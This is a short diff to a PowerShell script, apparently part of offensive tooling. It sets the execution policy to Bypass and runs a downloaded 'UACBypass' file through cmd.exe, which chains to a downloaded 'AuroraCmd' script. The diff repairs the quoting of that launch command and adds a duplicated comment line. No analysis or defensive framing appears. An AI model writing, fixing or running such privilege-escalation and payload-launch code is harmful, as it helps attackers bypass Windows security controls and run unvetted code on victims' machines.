@@ -10,6 +10,7 @@
 # Set execution policy to bypass for the current process
 # Set execution policy to bypass for the current process
 
+# Set execution policy to bypass for the current process
 try {
     Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
 } catch {
@@ -49,7 +50,7 @@ try {
 
 # Execute the downloaded scripts
 try {
-    Start-Process -FilePath 'cmd.exe' -ArgumentList "/c `"$tempUACBypass cmd.exe /c `"$tempAuroraCmd`"`" -NoNewWindow -Wait
+    Start-Process -FilePath 'cmd.exe' -ArgumentList "/c `"$tempUACBypass cmd.exe /c `"$tempAuroraCmd`"" -NoNewWindow -Wait
     Write-Host "Scripts executed successfully." -ForegroundColor Green
 } catch {
     Write-Host "Failed to execute scripts: $_" -ForegroundColor Red
